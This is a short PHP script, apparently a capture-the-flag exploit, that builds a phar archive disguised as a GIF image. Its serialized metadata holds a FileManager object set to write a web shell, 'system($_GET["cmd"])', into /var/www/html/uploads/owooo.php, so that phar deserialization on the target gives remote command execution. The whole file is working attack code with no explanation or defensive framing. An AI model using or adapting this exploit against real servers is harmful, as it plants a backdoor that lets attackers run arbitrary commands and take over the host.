<?php

ini_set('phar.readonly', 0);

require('ghostgif.php');

$phar_path = 'writable/myphar.phar';

@unlink($phar_path);
$phar = new Phar($phar_path);
$phar->startBuffering();
$phar->setStub("GIF89a <?php __HALT_COMPILER(); ?>");
$myobj = new FileManager('upload', '/var/www/html/uploads/owooo.php', 'Owo<?php system($_GET["cmd"]);');
$phar->setMetadata($myobj);
$phar->addFromString('test.gif', "GIF89a\x01\x00\x01\x00\x00\x00\x00\x3b");
$phar->stopBuffering();

echo 'done';
